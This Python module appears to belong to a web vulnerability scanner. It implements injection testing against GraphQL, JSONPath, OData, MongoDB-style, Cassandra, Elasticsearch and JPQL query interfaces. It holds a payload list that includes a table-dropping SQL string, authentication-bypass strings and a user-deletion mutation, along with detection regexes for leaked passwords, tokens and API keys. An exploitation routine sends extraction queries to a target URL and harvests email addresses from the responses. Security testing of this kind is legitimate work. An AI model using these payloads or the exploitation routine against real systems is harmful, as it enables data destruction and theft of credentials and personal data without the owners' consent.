"""
Custom Query Language Injection Context Implementation

Detects and exploits injection vulnerabilities in custom query languages
like GraphQL, JSONPath, OData, etc.
"""

import re
import json
from typing import List, Dict, Any, Tuple, Optional
from .base import InjectionContext, InjectionContextType


class CustomQueryInjectionContext(InjectionContext):
    """
    Custom query language injection attack context.
    Detects and exploits injection vulnerabilities in GraphQL, JSONPath,
    OData, and other custom query languages.
    """
    
    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.CUSTOM_QUERY
    
    def _load_payloads(self) -> List[str]:
        """Load custom query language injection payloads."""
        return [
            # GraphQL injection
            '{ __schema { types { name } } }',
            '{ __type(name: "User") { fields { name } } }',
            'query { users { id password } }',
            'mutation { deleteUser(id: "1") }',
            '{ users(where: {admin: {_eq: true}}) { id } }',
            '") { id admin } }',
            
            # GraphQL introspection
            'query IntrospectionQuery { __schema { queryType { name } } }',
            '{ __schema { mutationType { fields { name } } } }',
            '{ __type(name: "Query") { fields { name args { name } } } }',
            
            # JSONPath injection
            '$..*',
            '$..password',
            '$..admin',
            '$[?(@.admin==true)]',
            '$[*].password',
            
            # OData injection
            "$filter=role eq 'admin'",
            "$filter=contains(password,'admin')",
            "$expand=*",
            "$select=*,password",
            "$orderby=id desc",
            
            # MongoDB-like query injection
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"admin": {"$exists": true}}',
            
            # CQL (Cassandra Query Language)
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM system.schema_keyspaces--",
            
            # ElasticSearch DSL injection
            '{"query": {"match_all": {}}}',
            '{"query": {"wildcard": {"password": "*"}}}',
            '{"_source": ["password", "admin"]}',
            
            # REST API parameter injection
            'admin=true',
            'role=admin',
            'isAdmin=1',
            '&admin=true',
            
            # JPQL/HQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "1' OR '1'='1' ORDER BY id--",
        ]
    
    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        """Load custom query language error patterns for detection."""
        return [
            # GraphQL errors
            {'pattern': r'GraphQL.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Syntax Error.*GraphQL', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Cannot query field', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'Unknown.*directive', 'type': 'error', 'confidence': 0.85},
            
            # GraphQL introspection responses
            {'pattern': r'__schema', 'type': 'data', 'confidence': 0.90},
            {'pattern': r'__type', 'type': 'data', 'confidence': 0.90},
            {'pattern': r'queryType', 'type': 'data', 'confidence': 0.85},
            
            # MongoDB errors
            {'pattern': r'MongoError', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'mongodb.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'\$where.*not.*allowed', 'type': 'error', 'confidence': 0.90},
            
            # OData errors
            {'pattern': r'OData.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'Invalid.*OData', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'\$filter.*syntax', 'type': 'error', 'confidence': 0.85},
            
            # ElasticSearch errors
            {'pattern': r'elastic.*error', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'QueryParsingException', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'SearchParseException', 'type': 'error', 'confidence': 0.95},
            
            # Cassandra errors
            {'pattern': r'Cassandra.*error', 'type': 'error', 'confidence': 0.95},
            {'pattern': r'CQL.*syntax', 'type': 'error', 'confidence': 0.90},
            {'pattern': r'InvalidRequestException', 'type': 'error', 'confidence': 0.90},
            
            # Generic query errors
            {'pattern': r'Query.*error', 'type': 'error', 'confidence': 0.75},
            {'pattern': r'Invalid.*query', 'type': 'error', 'confidence': 0.75},
            {'pattern': r'Parsing.*error', 'type': 'error', 'confidence': 0.70},
        ]
    
    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None
    ) -> Tuple[bool, float, str]:
        """
        Analyze response for custom query language injection indicators.
        """
        # Check for error-based detection
        for pattern_info in self.detection_patterns:
            pattern = pattern_info['pattern']
            if re.search(pattern, response_body, re.IGNORECASE):
                evidence = f"Custom query error/data pattern detected: {pattern}"
                return True, pattern_info['confidence'], evidence
        
        # Check for GraphQL introspection data
        if self._check_graphql_introspection(response_body):
            evidence = "GraphQL introspection query successful"
            return True, 0.90, evidence
        
        # Check for data exfiltration
        if self._check_data_exfiltration(response_body):
            evidence = "Custom query injection with data exfiltration detected"
            return True, 0.85, evidence
        
        # Check for unauthorized access
        if self._check_unauthorized_access(response_body):
            evidence = "Custom query injection with unauthorized access detected"
            return True, 0.80, evidence
        
        return False, 0.0, "No custom query injection detected"
    
    def _check_graphql_introspection(self, response_body: str) -> bool:
        """Check for GraphQL introspection data."""
        try:
            data = json.loads(response_body)
            if isinstance(data, dict):
                # Check for common introspection fields
                if '__schema' in str(data) or '__type' in str(data):
                    return True
                if 'data' in data and '__schema' in str(data.get('data', {})):
                    return True
        except json.JSONDecodeError:
            pass
        
        return False
    
    def _check_data_exfiltration(self, response_body: str) -> bool:
        """Check for sensitive data exfiltration."""
        sensitive_fields = [
            r'"password":\s*"[^"]+',
            r'"admin":\s*true',
            r'"secret":\s*"[^"]+',
            r'"token":\s*"[^"]+',
            r'"apiKey":\s*"[^"]+',
        ]
        
        match_count = 0
        for field in sensitive_fields:
            if re.search(field, response_body, re.IGNORECASE):
                match_count += 1
        
        return match_count >= 2
    
    def _check_unauthorized_access(self, response_body: str) -> bool:
        """Check for unauthorized access indicators."""
        indicators = [
            r'"role":\s*"admin"',
            r'"isAdmin":\s*true',
            r'"privileges":\s*\[[^\]]*"admin"',
        ]
        
        for indicator in indicators:
            if re.search(indicator, response_body, re.IGNORECASE):
                return True
        
        return False
    
    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Attempt to exploit custom query language injection.
        """
        import requests
        
        exploitation_results = {
            'schema_extracted': False,
            'sensitive_data': [],
            'query_types': [],
        }
        
        # Try GraphQL introspection
        graphql_introspection_payloads = [
            '{ __schema { types { name } } }',
            '{ __type(name: "Query") { fields { name } } }',
        ]
        
        for payload in graphql_introspection_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Check for introspection data
                if self._check_graphql_introspection(response.text):
                    exploitation_results['schema_extracted'] = True
                    
                    try:
                        data = json.loads(response.text)
                        if 'data' in data and '__schema' in data['data']:
                            types = data['data']['__schema'].get('types', [])
                            exploitation_results['query_types'] = [t.get('name') for t in types if isinstance(t, dict)]
                    except (json.JSONDecodeError, KeyError, TypeError):
                        pass
                
            except requests.RequestException:
                continue
        
        # Try to extract sensitive data
        data_extraction_payloads = [
            '$..*',
            '{ users { id email } }',
        ]
        
        for payload in data_extraction_payloads:
            try:
                if parameter_type.upper() == "GET":
                    response = requests.get(
                        target_url,
                        params={vulnerable_parameter: payload},
                        timeout=10
                    )
                else:
                    response = requests.post(
                        target_url,
                        data={vulnerable_parameter: payload},
                        timeout=10
                    )
                
                # Look for sensitive data
                email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                emails = re.findall(email_pattern, response.text)
                if emails:
                    exploitation_results['sensitive_data'].extend(emails[:5])  # Limit to 5
                
            except requests.RequestException:
                continue
        
        return exploitation_results if any(exploitation_results.values()) else None
    
    # ========================================
    # Six-Step Injection Testing Methodology (Stub Implementations)
    # ========================================
    
    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        """Step 1: Supply unexpected syntax and context-specific payloads."""
        return self.payloads
    
    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None
    ) -> Tuple[bool, List[str]]:
        """Step 2: Detect anomalies and error messages in responses."""
        anomalies = []
        for pattern_info in self.detection_patterns:
            if re.search(pattern_info['pattern'], response_body, re.IGNORECASE):
                anomalies.append(f"custom_query_error: {pattern_info['pattern']}")
        return len(anomalies) > 0, anomalies
    
    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str]
    ) -> Dict[str, Any]:
        """Step 3: Analyze and extract error/evidence from response."""
        return {
            'error_type': 'custom_query_injection',
            'details': {'anomalies': anomalies},
            'context_info': {},
            'confidence': 0.80 if anomalies else 0.0
        }
    
    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Tuple[bool, float, str]:
        """Step 4: Mutate input systematically to confirm or disprove vulnerabilities."""
        return True, 0.75, "Custom query injection verification (basic)"
    
    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Step 5: Build proof-of-concept payloads for safe, verifiable exploits."""
        return {
            'poc_payload': '{__schema{types{name}}}',
            'expected_result': 'GraphQL schema information',
            'safety_notes': 'This POC only queries schema without modification',
            'reproduction_steps': ['Send custom query with payload'],
            'original_payload': successful_payload
        }
    
    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None
    ) -> Optional[Dict[str, Any]]:
        """Step 6: Exploitation automation for verified cases."""
        # Use existing attempt_exploitation logic
        return self.attempt_exploitation(target_url, vulnerable_parameter, parameter_type, poc_payload)
    
    def get_description(self) -> str:
        return "Custom Query Language Injection - Tests for vulnerabilities in GraphQL, JSONPath, OData, etc."
